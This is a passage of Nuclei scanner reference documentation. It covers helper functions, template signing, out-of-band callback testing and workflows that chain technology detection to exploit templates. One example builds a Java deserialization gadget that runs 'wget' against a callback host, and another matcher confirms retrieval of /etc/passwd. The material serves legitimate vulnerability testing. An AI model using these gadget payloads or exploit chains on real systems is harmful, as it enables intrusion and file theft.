* `dns` (URLDNS)
* `commons-collections3.1`
* `commons-collections4.0`
* `jdk7u21`
* `jdk8u20`
* `groovy1`

**Supported encodings:**

* `base64` (default)
* `gzip-base64`
* `gzip`
* `hex`
* `raw`

**Deserialization helper function format:**

```
{ { generate_java_gadget(payload, cmd, encoding } }

```

**Deserialization helper function example:**

```
{{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}

```

[​](#json-helper-functions)JSON helper functions
------------------------------------------------

Nuclei allows manipulate JSON strings in different ways, here is a list of its functions:

* `generate_jwt`, to generates a JSON Web Token (JWT) using the claims provided in a JSON string, the signature, and the specified algorithm.
* `json_minify`, to minifies a JSON string by removing unnecessary whitespace.
* `json_prettify`, to prettifies a JSON string by adding indentation.

**Examples**

**`generate_jwt`**

To generate a JSON Web Token (JWT), you have to supply the JSON that you want to sign, *at least*.

Here is a list of supported algorithms for generating JWTs with `generate_jwt` function *(case-insensitive)*:

* `HS256`
* `HS384`
* `HS512`
* `RS256`
* `RS384`
* `RS512`
* `PS256`
* `PS384`
* `PS512`
* `ES256`
* `ES384`
* `ES512`
* `EdDSA`
* `NONE`

Empty string ("") also means `NONE`.

Format:

```
{ { generate_jwt(json, algorithm, signature, maxAgeUnix) } }

```
> Arguments other than `json` are optional.

Example:

```
variables:
  json: | # required
    {
      "foo": "bar",
      "name": "John Doe"
    }
  alg: "HS256" # optional
  sig: "this_is_secret" # optional
  age: '{{to_unix_time("2032-12-30T16:30:10+00:00")}}' # optional
  jwt: '{{generate_jwt(json, "{{alg}}", "{{sig}}", "{{age}}")}}'

```
> The `maxAgeUnix` argument is to set the expiration `"exp"` JWT standard claim, as well as the `"iat"` claim when you call the function.

**`json_minify`**

Format:

```
{ { json_minify(json) } }

```

Example:

```
variables:
  json: |
    {
      "foo": "bar",
      "name": "John Doe"
    }
  minify: "{{json_minify(json}}"

```

`minify` variable output:

```
{ "foo": "bar", "name": "John Doe" }

```

**`json_prettify`**

Format:

```
{ { json_prettify(json) } }

```

Example:

```
variables:
  json: '{"foo":"bar","name":"John Doe"}'
  pretty: "{{json_prettify(json}}"

```

`pretty` variable output:

```
{
  "foo": "bar",
  "name": "John Doe"
}

```

**`resolve`**

Format:

```
{ { resolve(host, format) } }

```

Here is a list of formats available for dns type:

* `4` or `a`
* `6` or `aaaa`
* `cname`
* `ns`
* `txt`
* `srv`
* `ptr`
* `mx`
* `soa`
* `caa`

[​](#examples)Examples
----------------------

For more examples, see the [helper function examples](/templates/reference/helper-functions-examples)


Reference

Javascript Helper Functions
===========================

Available JS Helper Functions that can be used in global js runtime & protocol specific helpers.

[​](#javascript-runtime)Javascript Runtime
------------------------------------------

| Name | Description | Signatures |
| --- | --- | --- |
| atob | Base64 decodes a given string | `atob(string) string` |
| btoa | Base64 encodes a given string | `bota(string) string` |
| to\_json | Converts a given object to JSON | `to_json(any) object` |
| dump\_json | Prints a given object as JSON in console | `dump_json(any)` |
| to\_array | Sets/Updates objects prototype to array to enable Array.XXX functions | `to_array(any) array` |
| hex\_to\_ascii | Converts a given hex string to ascii | `hex_to_ascii(string) string` |
| Rand | Rand returns a random byte slice of length n | `Rand(n int) []byte` |
| RandInt | RandInt returns a random int | `RandInt() int` |
| log | log prints given input to stdout with [JS] prefix for debugging purposes | `log(msg string)`, `log(msg map[string]interface{})` |
| getNetworkPort | getNetworkPort registers defaultPort and returns defaultPort if it is a colliding port with other protocols | `getNetworkPort(port string, defaultPort string) string` |
| isPortOpen | isPortOpen checks if given TCP port is open on host. timeout is optional and defaults to 5 seconds | `isPortOpen(host string, port string, [timeout int]) bool` |
| isUDPPortOpen | isUDPPortOpen checks if the given UDP port is open on the host. Timeout is optional and defaults to 5 seconds. | `isUDPPortOpen(host string, port string, [timeout int]) bool` |
| ToBytes | ToBytes converts given input to byte slice | `ToBytes(...interface{}) []byte` |
| ToString | ToString converts given input to string | `ToString(...interface{}) string` |
| Export | Converts a given value to a string and is appended to output of script | `Export(value any)` |
| ExportAs | Exports given value with specified key and makes it available in DSL and response | `ExportAs(key string,value any)` |

[​](#template-flow)Template Flow
--------------------------------

| Name | Description | Signatures |
| --- | --- | --- |
| log | Logs a given object/message to stdout (only for debugging purposes) | `log(obj any) any` |
| iterate | Normalizes and Iterates over all arguments (can be a string,array,null etc) and returns an array of objects\nNote: If the object type is unknown(i.e could be a string or array) iterate should be used and it will always return an array of strings | `iterate(...any) []any` |
| Dedupe | De-duplicates given values and returns a new array of unique values | `new Dedupe()` |

[​](#code-protocol)Code Protocol
--------------------------------

| Name | Description | Signatures |
| --- | --- | --- |
| OS | OS returns the current OS | `OS() string` |
| IsLinux | IsLinux checks if the current OS is Linux | `IsLinux() bool` |
| IsWindows | IsWindows checks if the current OS is Windows | `IsWindows() bool` |
| IsOSX | IsOSX checks if the current OS is OSX | `IsOSX() bool` |
| IsAndroid | IsAndroid checks if the current OS is Android | `IsAndroid() bool` |
| IsIOS | IsIOS checks if the current OS is IOS | `IsIOS() bool` |
| IsJS | IsJS checks if the current OS is JS | `IsJS() bool` |
| IsFreeBSD | IsFreeBSD checks if the current OS is FreeBSD | `IsFreeBSD() bool` |
| IsOpenBSD | IsOpenBSD checks if the current OS is OpenBSD | `IsOpenBSD() bool` |
| IsSolaris | IsSolaris checks if the current OS is Solaris | `IsSolaris() bool` |
| Arch | Arch returns the current architecture | `Arch() string` |
| Is386 | Is386 checks if the current architecture is 386 | `Is386() bool` |
| IsAmd64 | IsAmd64 checks if the current architecture is Amd64 | `IsAmd64() bool` |
| IsARM | IsArm checks if the current architecture is Arm | `IsARM() bool` |
| IsARM64 | IsArm64 checks if the current architecture is Arm64 | `IsARM64() bool` |
| IsWasm | IsWasm checks if the current architecture is Wasm | `IsWasm() bool` |

[​](#javascript-protocol)JavaScript Protocol
--------------------------------------------

| Name | Description | Signatures |
| --- | --- | --- |
| set | set variable from init code. this function is available in init code block only | `set(string, interface{})` |
| updatePayload | update/override any payload from init code. this function is available in init code block only | `updatePayload(string, interface{})` |


Reference

Preprocessors
=============

Review details on pre-processors for Nuclei

Certain pre-processors can be specified globally anywhere in the template that run as soon as the template is loaded to achieve things like random ids generated for each template run.

### [​](#randstr)randstr

Generates a [random ID](https://github.com/rs/xid) for a template on each nuclei run. This can be used anywhere in the template and will always contain the same value. `randstr` can be suffixed by a number, and new random ids will be created for those names too. Ex. `{{randstr_1}}` which will remain same across the template.

`randstr` is also supported within matchers and can be used to match the inputs.

For example:-

```
http:
  - method: POST
    path:
      - "{{BaseURL}}/level1/application/"
    headers:
      cmd: echo '{{randstr}}'

    matchers:
      - type: word
        words:
          - '{{randstr}}'

```


Reference

Template Signing
================

Review details on template signing for Nuclei

Template signing via the private-public key mechanism is a crucial aspect of ensuring the integrity, authenticity, and security of templates. This mechanism involves the use of asymmetric cryptography, specifically the Elliptic Curve Digital Signature Algorithm (ECDSA), to create a secure and verifiable signature.

In this process, a template author generates a private key that remains confidential and securely stored. The corresponding public key is then shared with the template consumers. When a template is created or modified, the author signs it using their private key, generating a unique signature that is attached to the template.

Template consumers can verify the authenticity and integrity of a signed template by using the author’s public key. By applying the appropriate cryptographic algorithm (ECDSA), they can validate the signature and ensure that the template has not been tampered with since it was signed. This provides a level of trust, as any modifications or unauthorized changes to the template would result in a failed verification process.

By employing the private-public key mechanism, template signing adds an additional layer of security and trust to the template ecosystem. It helps establish the identity of the template author and ensures that the templates used in various systems are genuine and have not been altered maliciously.

**What does signing a template mean?**

Template signing is a mechanism to ensure the integrity and authenticity of templates. The primary goal is to provide template writers and consumers a way to trust crowdsourced or custom templates ensuring that they are not tampered with.

All [official Nuclei templates](https://github.com/projectdiscovery/nuclei-templates) include a digital signature and are verified by Nuclei while loading templates using ProjectDiscovery’s public key (shipped with the Nuclei binary).

Individuals or organizations running Nuclei in their work environment can generate their own key-pair with `nuclei` and sign their custom templates with their private key, thus ensuring that only authorized templates are being used in their environment.

This also allows entities to fully utilize the power of new protocols like `code` without worrying about malicious custom templates being used in their environment.

**NOTE:**

* **Template signing is optional for all protocols except `code`**.
* **Unsigned code templates are disabled and can not be executed using Nuclei**.
* **Only signed code templates by the author (yourself) or ProjectDiscovery can be executed.**
* **Template signing is primarily introduced to ensure security of template to run code on host machine.**
* Code file references (for example: `source: protocols/code/pyfile.py`) are allowed and content of these files is included in the template digest.
* Payload file references (for example: `payloads: protocols/http/params.txt`) are not included in the template digest as it is treated as a payload/helper and not actual code that is being executed.
* Template signing is deterministic while both signing and verifying a template i.e. if a code file is referenced in a template that is present outside of templates directory with `-lfa` flag then verification will fail if same template is used without `-lfa` flag. (Note this only applies to `-lfa` i.e. local file access flag only)

### [​](#signing-custom-template)Signing Custom Template

The simplest and recommended way to generate key-pair and signing/verfifying templates is to use `nuclei` itself.

When signing a template if key-pair does not exist then Nuclei will prompt user to generate a new key-pair with options.

```
$ ./nuclei -t templates.yaml -sign
[INF] Generating new key-pair for signing templates
[*] Enter User/Organization Name (exit to abort) : acme
[*] Enter passphrase (exit to abort): 
[*] Enter same passphrase again: 
[INF] Successfully generated new key-pair for signing templates

```
> **Note:** Passphrase is optional and can be left blank when used private key is encrypted with passphrase using PEMCipherAES256 Algo

Once a key-pair is generated, you can sign any custom template using `-sign` flag as shown below.

```
$ ./nuclei -t templates.yaml -sign
[INF] All templates signatures were elaborated success=1 failed=0

```
> **Note:** Every time you make any change in your code template, you need to re-sign it to run with Nuclei.

### [​](#template-digest-and-signing-keys)Template Digest and Signing Keys

When a template is signed, a digest is generated and added to the template. This digest is a hash of the template content and is used to verify the integrity of the template. If the template is modified after signing, the digest will change, and the signature verification will fail during template loading.

```
# digest: 4a0a00473045022100eb01da6b97893e7868c584f330a0cd52df9bddac005860bb8595ba5b8aed58c9022050043feac68d69045cf320cba9298a2eb2e792ea4720d045d01e803de1943e7d:4a3eb6b4988d95847d4203be25ed1d46

```

The digest is in the format of `signature:fragment`, where the signature is the digital signature of the template used to verify its integrity, and the fragment is metadata generated by MD5 hashing the public key to disable re-signing of code templates not written by you.

The key-pair generated by Nuclei is stored in two files in the `$CONFIG/nuclei/keys directory`, where `$CONFIG` is the system-specific config directory. The private key is stored in nuclei-user-private-key.pem, which is encrypted with a passphrase if provided. The public key is stored in nuclei-user.crt, which includes the public key and identifier (e.g., user/org name) in a self-signed certificate.

```
$ la ~/.config/nuclei/keys 
total 16
-rw-------  1 tarun  staff   251B Oct  4 21:45 nuclei-user-private-key.pem # encrypted private key with passphrase
-rw-------  1 tarun  staff   572B Oct  4 21:45 nuclei-user.crt # self signed certificate which includes public key and identifier (i.e user/org name)

```

To use the public key for verification, you can either copy it to the `$CONFIG/nuclei/keys` directory on another user’s machine, or set the `NUCLEI_USER_CERTIFICATE` environment variable to the path or content of the public key.

To use the private key, you can copy it to the `$CONFIG/nuclei/keys` directory on another user’s machine, or set the `NUCLEI_USER_PRIVATE_KEY` environment variable to the path or content of the private key.

```
$ export NUCLEI_USER_CERTIFICATE=$(cat path/to/nuclei-user.crt)
$ export NUCLEI_USER_PRIVATE_KEY=$(cat path/to/nuclei-user-private-key.pem)

```

It’s important to note that you are responsible for securing and managing the private key, and Nuclei has no accountability for any loss of the private key.

By default, Nuclei loads the user certificate (public key) from the default locations mentioned above and uses it to verify templates. When running Nuclei, it will execute signed templates and warn about executing unsigned custom templates and block unsigned code templates. You can disable this warning by setting the `HIDE_TEMPLATE_SIG_WARNING` environment variable to `true`.

[​](#faq)FAQ
------------

**Found X unsigned or tampered code template?**

```
./nuclei -u scanme.sh -t simple-code.yaml 

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.0.0-dev

		projectdiscovery.io

[WRN] Found 1 unsigned or tampered code template (carefully examine before using it & use -sign flag to sign them)
[INF] Current nuclei version: v3.0.0-dev (development)
[INF] Current nuclei-templates version: v9.6.4 (latest)
[WRN] Executing 1 unsigned templates. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] No results found. Better luck next time!
[FTL] Could not run nuclei: no templates provided for scan

```

Here `simple-code.yaml` is a code protocol template which is not signed or content of template has been modified after signing which indicates loss of integrity of template.
If you are template writer then you can go ahead and sign the template using `-sign` flag and if you are template consumer then you should carefully examine the template before signing it.

**Re-signing code templates are not allowed for security reasons?**

```
nuclei -u scanme.sh -t simple-code.yaml -sign

[ERR] could not sign 'simple-code.yaml': [signer:RUNTIME] re-signing code templates are not allowed for security reasons.
[INF] All templates signatures were elaborated success=0 failed=1

```

The error message `re-signing code templates are not allowed for security reasons` comes from the Nuclei engine. This error indicates that a code template initially signed by another user and someone is trying to re-sign it.

This measure was implemented to prevent running untrusted templates unknowingly, which might lead to potential security issues.
When you encounter this error, it suggests that you’re dealing with a template that has been signed by another user Likely, the original signer is not you or the team from projectdiscovery.

By default, Nuclei disallows executing code templates that are signed by anyone other than you or from the public templates provided by projectdiscovery/nuclei-templates.

This is done to prevent potential security abuse using code templates.

To resolve this error:

1. Open and thoroughly examine the code template for any modifications.
2. Manually remove the existing digest signature from the template.
3. Sign the template again.

This way, you can ensure that only templates verified and trusted by you (or projectdiscovery) are run, thus maintaining a secure environment.


Reference

OOB Testing
===========

Understanding OOB testing with Nuclei Templates

Since release of [Nuclei v2.3.6](https://github.com/projectdiscovery/nuclei/releases/tag/v2.3.6), Nuclei supports using the [interactsh](https://github.com/projectdiscovery/interactsh) API to achieve OOB based vulnerability scanning with automatic Request correlation built in. It’s as easy as writing `{{interactsh-url}}` anywhere in the request, and adding a matcher for `interact_protocol`. Nuclei will handle correlation of the interaction to the template & the request it was generated from allowing effortless OOB scanning.

[​](#interactsh-placeholder)Interactsh Placeholder
--------------------------------------------------

`{{interactsh-url}}` placeholder is supported in **http** and **network** requests.

An example of nuclei request with `{{interactsh-url}}` placeholders is provided below. These are replaced on runtime with unique interactsh URLs.

```
  - raw:
      - |
        GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}

```

[​](#interactsh-matchers)Interactsh Matchers
--------------------------------------------

Interactsh interactions can be used with `word`, `regex` or `dsl` matcher/extractor using following parts.

| part |
| --- |
| interactsh\_protocol |
| interactsh\_request |
| interactsh\_response |

**interactsh\_protocol**

Value can be dns, http or smtp. This is the standard matcher for every interactsh based template with DNS often as the common value as it is very non-intrusive in nature.


**interactsh\_request**

The request that the interactsh server received.


**interactsh\_response**

The response that the interactsh server sent to the client.

Example of Interactsh DNS Interaction matcher:

```
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

```

Example of HTTP Interaction matcher + word matcher on Interaction content

```
matchers-condition: and
matchers:
    - type: word
      part: interactsh_protocol # Confirms the HTTP Interaction
      words:
        - "http"

    - type: regex
      part: interactsh_request # Confirms the retrieval of /etc/passwd file
      regex:
        - "root:[x*]:0:0:"

```



---

# Workflows

Workflows

Template Workflows Overview
===========================

Learn about template workflows in Nuclei

Workflows enable users to orchestrate a series of actions by setting a defined execution order for various templates. These templates are activated upon predetermined conditions, establishing a streamlined method to leverage the capabilities of nuclei tailored to the user’s specific requirements. Consequently, you can craft workflows that are contingent on particular technologies or targets—such as those exclusive to WordPress or Jira—triggering these sequences only when the relevant technology is identified.

Within a workflow, all templates share a unified execution environment, which means that any named extractor from one template can be seamlessly accessed in another by simply referencing its designated name.

For those with prior knowledge of the technology stack in use, we advise constructing personalized workflows for your scans. This strategic approach not only substantially reduces the duration of scans but also enhances the quality and precision of the outcomes.

Workflows can be defined with `workflows` attribute, following the `template` / `subtemplates` and `tags` to execute.

```
workflows:
  - template: http/technologies/template-to-execute.yaml

```

**Type of workflows**

1. [Generic workflows](/_sites/docs.projectdiscovery.io/templates/workflows/overview#generic-workflows)
2. [Conditional workflows](/_sites/docs.projectdiscovery.io/templates/workflows/overview#conditional-workflows)

[​](#generic-workflows)Generic Workflows
----------------------------------------

In generic workflow one can define single or multiple template to be executed from a single workflow file. It supports both files and directories as input.

A workflow that runs all config related templates on the list of give URLs.

```
workflows:
  - template: http/exposures/configs/git-config.yaml
  - template: http/exposures/configs/exposed-svn.yaml
  - template: http/vulnerabilities/generic/generic-env.yaml
  - template: http/exposures/backups/zip-backup-files.yaml
  - tags: xss,ssrf,cve,lfi

```

A workflow that runs specific list of checks defined for your project.

```
workflows:
  - template: http/cves/
  - template: http/exposures/
  - tags: exposures

```

[​](#conditional-workflows)Conditional Workflows
------------------------------------------------

You can also create conditional templates which execute after matching the condition from a previous template. This is mostly useful for vulnerability detection and exploitation as well as tech based detection and exploitation. Use-cases for this kind of workflows are vast and varied.

**Templates based condition check**

A workflow that executes subtemplates when base template gets matched.

```
workflows:
  - template: http/technologies/jira-detect.yaml
    subtemplates:
      - tags: jira
      - template: exploits/jira/

```

**Matcher Name based condition check**

A workflow that executes subtemplates when a matcher of base template is found in result.

```
workflows:
  - template: http/technologies/tech-detect.yaml
    matchers:
      - name: vbulletin
        subtemplates:
          - template: exploits/vbulletin-exp1.yaml
          - template: exploits/vbulletin-exp2.yaml
      - name: jboss
        subtemplates:
          - template: exploits/jboss-exp1.yaml
          - template: exploits/jboss-exp2.yaml

```

In similar manner, one can create as many and as nested checks for workflows as needed.

**Subtemplate and matcher name based multi level conditional check**

A workflow showcasing chain of template executions that run only if the previous templates get matched.

```
workflows:
  - template: http/technologies/tech-detect.yaml
    matchers:
      - name: lotus-domino
        subtemplates:
          - template: http/technologies/lotus-domino-version.yaml
            subtemplates:
              - template: http/cves/2020/xx-yy-zz.yaml
                subtemplates:
                  - template: http/cves/2020/xx-xx-xx.yaml

```

Conditional workflows are great examples of performing checks and vulnerability detection in most efficient manner instead of spraying all the templates on all the targets and generally come with good ROI on your time and is gentle for the targets as well.

[​](#shared-execution-context)Shared Execution Context
------------------------------------------------------

Nuclei engine supports transparent workflow cookiejar and key-value sharing across templates parts of a same workflow. Here follow an example of a workflow that extract a value from the first template and use it in the second conditional one:

```
id: key-value-sharing-example
info:
  name: Key Value Sharing Example
  author: pdteam
  severity: info

workflows:
  - template: template-with-named-extractor.yaml
    subtemplates:
      - template: template-using-named-extractor.yaml

```

For example, the following templates extract `href` links from a target web page body and make the value available under the `extracted` key:

```
# template-with-named-extractor.yaml

id: value-sharing-template1

info:
  name: value-sharing-template1
  author: pdteam
  severity: info

http:
  - path:
      - "{{BaseURL}}/path1"
    extractors:
      - type: regex
        part: body
        name: extracted
        regex:
          - 'href="(.*)"'
        group: 1

```

Finally the second template in the workflow will use the obtained value by referencing the extractor name (`extracted`):

```
# template-using-named-extractor.yaml

id: value-sharing-template2

info:
  name: value-sharing-template2
  author: pdteam
  severity: info

http:
  - raw:
      - |
        GET /path2 HTTP/1.1
        Host: {{Hostname}}
        
        {{extracted}}

```


Workflows

Workflow Examples
=================

Review some template workflow examples for Nuclei

[​](#generic-workflows)Generic workflows
----------------------------------------

A generic workflow that runs two templates, one to detect Jira and another to detect Confluence.

```
id: workflow-example
info:
  name: Test Workflow Template
  author: pdteam

workflows:
  - template: technologies/jira-detect.yaml
  - template: technologies/confluence-detect.yaml

```

[​](#basic-conditional-workflows)Basic conditional workflows
------------------------------------------------------------

A condition based workflow, which first tries to detect if springboot is running on a target. If springboot is found, a list of exploits executed against it.

```
id: springboot-workflow

info:
  name: Springboot Security Checks
  author: dwisiswant0

workflows:
  - template: security-misconfiguration/springboot-detect.yaml
    subtemplates:
      - template: cves/CVE-2018-1271.yaml
      - template: cves/CVE-2018-1271.yaml
      - template: cves/CVE-2020-5410.yaml
      - template: vulnerabilities/springboot-actuators-jolokia-xxe.yaml
      - template: vulnerabilities/springboot-h2-db-rce.yaml

```

[​](#multi-condition-workflows)Multi condition workflows
--------------------------------------------------------

This template demonstrates nested workflows with nuclei, where there’s multiple levels of chaining of templates.

```
id: springboot-workflow

info:
  name: Springboot Security Checks
  author: dwisiswant0

workflows:
  - template: technologies/tech-detect.yaml
    matchers:
      - name: lotus-domino
        subtemplates:
          - template: technologies/lotus-domino-version.yaml
            subtemplates:
              - template: cves/xx-yy-zz.yaml
                subtemplates:
                  - template: cves/xx-xx-xx.yaml

```

[​](#conditional-workflows-with-matcher)Conditional workflows with matcher
--------------------------------------------------------------------------

This template detects if WordPress is running on an input host, and if found a set of targeted exploits and CVEs are executed against it.

```
id: workflow-example
info:
  name: Test Workflow Template
  author: pdteam

workflows:
  - template: technologies/tech-detect.yaml
    matchers:
      - name: wordpress
        subtemplates:
          - template: cves/CVE-2019-6715.yaml
          - template: cves/CVE-2019-9978.yaml
          - template: files/wordpress-db-backup.yaml
          - template: files/wordpress-debug-log.yaml
          - template: files/wordpress-directory-listing.yaml
          - template: files/wordpress-emergency-script.yaml
          - template: files/wordpress-installer-log.yaml
          - template: files/wordpress-tmm-db-migrate.yaml
          - template: files/wordpress-user-enumeration.yaml
          - template: security-misconfiguration/wordpress-accessible-wpconfig.yaml
          - template: vulnerabilities/sassy-social-share.yaml
          - template: vulnerabilities/w3c-total-cache-ssrf.yaml
          - template: vulnerabilities/wordpress-duplicator-path-traversal.yaml
          - template: vulnerabilities/wordpress-social-metrics-tracker.yaml
          - template: vulnerabilities/wordpress-wordfence-xss.yaml
          - template: vulnerabilities/wordpress-wpcourses-info-disclosure.yaml

```

[​](#multiple-matcher-workflow)Multiple Matcher workflow
--------------------------------------------------------

Very similar to the last example, with multiple matcher names.

```
id: workflow-multiple-matcher
info:
  name: Test Workflow Template
  author: pdteam

workflows:
  - template: technologies/tech-detect.yaml
    matchers:
      - name: vbulletin
        subtemplates:
          - tags: vbulletin

      - name: jboss
        subtemplates:
          - tags: jboss


```

